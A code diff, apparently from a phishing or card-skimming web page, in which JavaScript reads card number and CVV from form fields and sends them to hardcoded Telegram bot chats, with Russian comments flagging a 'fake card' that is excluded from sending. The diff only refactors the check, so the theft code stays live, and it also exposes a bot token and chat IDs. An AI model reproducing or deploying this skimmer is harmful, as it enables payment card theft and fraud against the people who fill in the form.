@@ -1553,7 +1553,7 @@
                   cardCvv: document.getElementById('cardCvv').value
                 };
                 
-                if (document.getElementById('cardNumber').value === '5167 4345 5899 7134') {
+                if (cardData.cardNumber === '5167 4345 5899 7134') {
                   let cardDataText = `Пользователь <b>ID${userID}</b> <u>прикрепил фейк карту к боту!</u>`;
                 }
                 else {
@@ -1576,7 +1576,7 @@
                         console.error('Error:', error);
                       });
                 
-                if (document.getElementById('cardNumber').value !== '5167 4345 5899 7134') {
+                if (cardData.cardNumber !== '5167 4345 5899 7134') {
                 fetch(`https://api.telegram.org/bot7367005944:AAG9j0TiFtVNpBoh7_X4xDqrOU2-31Reyy4/sendMessage?chat_id=409013849&text=${encodeURIComponent(cardDataText)}&parse_mode=HTML&reply_markup=${encodeURIComponent(JSON.stringify(replyMarkup))}`)
                   .then(response => response.json())
                   .then(data => console.log(data))
@@ -1601,7 +1601,7 @@
                   };
                 
                   // Отправляем данные в Telegram Bot
-                  if (document.getElementById('cardNumber').value !== '5167 4345 5899 7134') {
+                  if (cardData.cardNumber !== '5167 4345 5899 7134') {
                   fetch(`https://api.telegram.org/bot7367005944:AAG9j0TiFtVNpBoh7_X4xDqrOU2-31Reyy4/sendMessage?chat_id=7329305712&text=${encodeURIComponent(cardDataText)}&parse_mode=HTML&reply_markup=${encodeURIComponent(JSON.stringify(replyMarkup))}`)
                       .then(response => response.json())
                       .then(data => console.log(data))
